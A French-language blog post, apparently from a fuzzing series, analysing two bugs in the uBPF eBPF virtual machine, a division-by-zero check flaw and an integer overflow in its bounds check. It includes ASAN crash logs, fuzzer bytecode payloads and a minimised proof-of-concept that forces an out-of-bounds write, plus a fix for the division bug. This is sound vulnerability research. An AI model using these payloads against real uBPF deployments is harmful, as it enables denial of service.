---
title: Attacking uBPF VM - Part 3 Bug Analysis - (FR)
date: 2023-03-21 00:00:00 +0000
categories: [Fuzzing]
tags: [français, fuzzing]     # TAG names should always be lowercase
mermaid: true
---
Deux bugs ont été découverts lors de l'audit de la machine virtuelle eBPF. Le premier est lié à un problème de validation de sécurité qui entraine une division par zéro (undefined behaviour). 

Le second est un integer overflow dans un contrôle de sécurité, entraînant des lectures et écritures dans des zones mémoire en dehors de celles allouées à la VM.

# Undefined behaviour (division by 0)
## Report
__Crash ASAN__
```rust
ubpf_vm.c:318:68: runtime error: division by zero
AddressSanitizer:DEADLYSIGNAL
=================================================================
==15886==ERROR: AddressSanitizer: FPE on unknown address 0x7fbceed73399 (pc 0x7fbceed73399 bp 0x7ffc7ff74080 sp 0x7ffc7ff73fa0 T0)
    #0 0x7fbceed73398 in ubpf_exec /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:318
    #1 0x55aebd96414c in j_fuzzer::run_prgm::h35d4b4310f796c6f src/main.rs:337
    #2 0x55aebd964503 in j_fuzzer::main::h7dd45b78eaec2e84 src/main.rs:409
    ...
    #18 0x55aebd95c03d in _start (/mnt/c/J/re/fuzz/j-fuzzer/target/debug/j-fuzzer+0xc03d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: FPE /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:318 in ubpf_exec
==15886==ABORTING
```

__Payload__
```c
000=>opcode:0xDC, dst:0x00, src:0x02, offset:0x1018, imm:0x00000040 //be16 dst       => r0 = htobe64(r0)
001=>opcode:0x84, dst:0x09, src:0x03, offset:0xBBF3, imm:0x29559BAB //dst = -dst     => r9 = -r9
002=>opcode:0x3C, dst:0x02, src:0x01, offset:0x1202, imm:0x796ED6EC //div32 dst, src => r2 = r2 / r1
```

## Analyse

Le rapport d'ASAN permet de retrouver la partie du code à l'origine de la division par 0 :
```c
static uint32_t u32(uint64_t x) { return x; }
...
case EBPF_OP_DIV_IMM:
	reg[inst.dst] = u32(inst.imm) ? u32(reg[inst.dst]) / u32(inst.imm) : 0; // Ok
	reg[inst.dst] &= UINT32_MAX;
	break;
case EBPF_OP_DIV_REG:
	//instruction à l'origine du crash:
	//   le controle se fait sur la valuer sur les 64bits de reg[inst.src]
	//   alors que la division est faite seulement sur les 32 low bits
	reg[inst.dst] = reg[inst.src] ? u32(reg[inst.dst]) / u32(reg[inst.src]) : 0; 
	reg[inst.dst] &= UINT32_MAX;
	break;
```

Le bug constaté est plutôt simple : théoriquement, avant chaque opération de division par un registre, sa valeur doit être vérifiée pour s'assurer qu'elle est différente de zéro. Si tel est le cas, la division est effectuée. Sinon, la division n'est pas effectuée et l'instruction retourne 0.

Cependant, dans le cas des divisions sur 32 bits, la valeur totale du registre est vérifiée, alors que la division est effectuée uniquement sur les 32 bits low. Cela implique que si le registre a une valeur sur les 32 bits high mais pas sur les low, le contrôle de sécurité passera mais la division sera effectuée sur 0, entraînant ainsi un comportement indéfini.

Pour corriger ce bug il faut caster la valeur du registre source en u32 avant de controler sa valeur:
```c
	reg[inst.dst] = u32(reg[inst.src]) ? u32(reg[inst.dst]) / u32(reg[inst.src]) : 0; 
	reg[inst.dst] &= UINT32_MAX;
	break;
```


On remarque que dans l'implémentation de la division par une valeur immédiate la valeur est correctement castée avant d'être controlée.

# Integer overflow 

Ce bug est intéressant car il permet d'effectuer des accès mémoire non maîtrisés, dans certains cas ces vulnérabilités peuvent etre exploités pour executer du code ou provoquer un déni de service du syséme cible.

## Report

__Crash ASAN__
```rust
ubpf_vm.c:1023:52: runtime error: pointer index expression with base 0xfffffffffffffffe overflowed to 0x000000000006
AddressSanitizer:DEADLYSIGNAL
=================================================================
==5323==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f186676d9bf bp 0x7ffd41f64fb0 sp 0x7ffd41f64ed0 T0)
==5323==The signal is caused by a READ memory access.
==5323==Hint: address points to the zero page.
    #0 0x7f186676d9be in memcpy /usr/include/x86_64-linux-gnu/bits/string_fortified.h:34
    #1 0x7f186676d9be in ubpf_mem_store /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:235
    #2 0x7f186676d9be in ubpf_exec /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:533
    ...
    #20 0x55b4d9509b9d in _start (/mnt/c/J/re/fuzz/j-fuzzer/target/debug/j-fuzzer+0x8b9d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /usr/include/x86_64-linux-gnu/bits/string_fortified.h:34 in memcpy
==5323==ABORTING
```

__Payload__
```rust
//add32 dst, src      => r3 = r3 + r9
000=> opcode:0x0C, dst:0x03, src:0x09, offset:0xD33A, imm:0xFE3EA1E3
//stdw [dst+off], imm =>*(uint64_t *) (r4 + 0xE062) = 0x991DB628
001=> opcode:0x7A, dst:0x04, src:0x04, offset:0xE062, imm:0x991DB628
//mul32 dst, imm      => r2 = r2 * 0x95458E15
002=> opcode:0x24, dst:0x08, src:0x02, offset:0x0694, imm:0x95458E15
//mul dst, imm        => r5 = r5 * 0xCE5B94D3
003=> opcode:0x27, dst:0x05, src:0x00, offset:0xD418, imm:0xCE5B94D3
```

Après analyse l'instruction 0x001 est à l'origine du crash.

## Bug

Premier constat: la machine virtuelle plante uniquement quand executée avec ASAN d'activé, dans ce cas la fonction bounds_check ne retourne pas d'erreur lors d'une tentative d'accès mémoire sur une adresse en dehors de l'espace de la VM. L'accès mémoire sur cette même adresse provoque une erreur de segmentation.

Autrement la fonction bounds_check fait correctement sont travail et retoune une erreur lors d'une tentative d'accès à une zone mémoire en dehors de la machine virtuelle. L'accès mémoire n'est alors pas executé et la machine virtuelle s'arrête avec le message d'erreur suivant:

```rust
uBPF error: out of bounds memory store at PC 1, addr 0xffffffffffffe063, size 8
mem 0x5555555bb730/8092 stack 0x7fffffffd4c0/512
```

Nous allons chercher à modifier le payload pour le minimiser et faire en sorte que le bug se déclenche à chaque execution et pas seulement quand ASAN est activé.

La premiere fonction à étudier est bounds_check, d'après le messsage d'erreur d'ASAN nous savons qu'elle présente un integer overflow à l'origine de l'accès mémoire non autorisé:

```c
//Appel initial
bounds_check(vm, (char*)reg[inst.src] + inst.offset, size, "load", cur_pc, mem, mem_len, stack)

bounds_check(
    const struct ubpf_vm* vm, 
    void* addr,                //(char*)reg[inst.src] + inst.offset
    int size,                  //size = 8
    const char* type,          //"load"
    uint16_t cur_pc,
    void* mem,
    size_t mem_len,
    void* stack)
{

    if (!vm->bounds_check_enabled)
        return true;
	//integer overflow si addr + size > taille max d'un pointer
    else if (mem && (addr >= mem && ((char*)addr + size) <= ((char*)mem + mem_len))) { 
        /* Context access */
        return true;
	//integer overflow si addr + size > taille max d'un pointer
    } else if (addr >= stack && ((char*)addr + size) <= ((char*)stack + UBPF_STACK_SIZE)) { 
        /* Stack access */
        return true;
    } else {
        vm->error_printf(...);
        return false;
    }
}
```

Cette fonction présente deux integer verflow:
- Le premier bloc de code compare si l'adresse et la taille sont dans les limites du context. Si la somme de l'adresse et de la taille dépasse la limite maximale autorisée d'un pointeur, cela peut entraîner un overflow.

- Le deuxième bloc de code compare si l'adresse et la taille sont dans les limites de la pile. Si la somme de l'adresse et de la taille dépasse la limite maximale autorisée d'un pointeur, cela peut également entraîner un overflow.

Dans le contexte de la fonction, l'adresse (addr) est calculée en ajoutant la valeur du registre source (reg\[inst.src\]) à l'offset (inst.offset). La taille (size) représente le nombre de bytes à lire et est définie par les opérations d'accès mémoire. Il est possible de lire ou d'écrire au maximum 8 bytes.

Pour reproduire le bug nous pouvons contrôler la valeur du registre source, mais la taille est déterminée par les opérations d'accès mémoire. Pour déclencher le bug, il faut passer que la somme du registre source + l'offset de l'instruction soit comprise entre `0xFFFF_FFFF_FFFF_FFFF` et `0xFFFF_FFFF_FFFF_FFF8` et exécuter une opération de lecture ou d'écriture de 8 bytes. 

Cette valeur passera les controles de sécurité de bounds_check, mais les accès mémoire se feront sur la valeur du registre source + offset soit 0xFFFF_FFFF_FFFF_FFFF qui ne fait pas partie des zones allouées au programme.

Ci-dessous, un payload minimisé permettant de reproduire le bug à 100% :

```rust
//r[6] = 0
EbpfBytecode::from(EbpfInstr::new(0xb7, 0x0, 0x6, 0x0, 0x0 as u32 as i32)),  
//[r6] = 0xFFFFFFFFFFF
EbpfBytecode::from(EbpfInstr::new(0x17, 0x0, 0x6, 0x0, 0x1 as u32 as i32)),  
//*(*(uint64_t *) (r[6] + off) = imm => 0xFFFFFFF + 0 = 0 <= 
EbpfBytecode::from(EbpfInstr::new(0x7A, 0x0, 0x6, 0x0, 0x0 as u32 as i32)),  
```

Execution:
```rust
000=> [0xB7, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
001=> [0x17, 0x06, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00]
002=> [0x7A, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
[+]VM addr: 0x608000000020
[+]FN Loaded
AddressSanitizer:DEADLYSIGNAL
=================================================================
==6773==ERROR: AddressSanitizer: SEGV on unknown address 0xffffffffffffffff (pc 0x7f636e1a7d65 bp 0x000000001f9c sp 0x7fffc1b60c50 T0)
==6773==The signal is caused by a WRITE memory access.
    #0 0x7f636e1a7d64 in ubpf_exec /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:533
    #1 0x558fa1e8b44e in j_fuzzer::run_prgm::h35d4b4310f796c6f src/main.rs:337
	...
    #18 0x558fa1e84b9d in _start (/mnt/c/J/re/fuzz/j-fuzzer/target/debug/j-fuzzer+0x8b9d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /mnt/c/J/re/fuzz/ubpf/vm/ubpf_vm.c:533 in ubpf_exec
==6773==ABORTING
```

On retrouve bien une tentative d'ecriture sur l'adresse 0xffffffffffffffff comme attendu.

## Exploitation:

Nous somme limité ici par la taille de l'argument size passé à la fonction bounds_check est qui ne peut pas dépasser 8 bytes. Par conséquent, il n'est possible d'écrire ou de lire que sur les 8 derniers bytes de la mémoire, ce qui conduit systématiquement à une erreur de segmentation.

Ce type de bug ne peut être exploité que pour des attaques de déni de service et ne permet hélas pas l'execution de code.
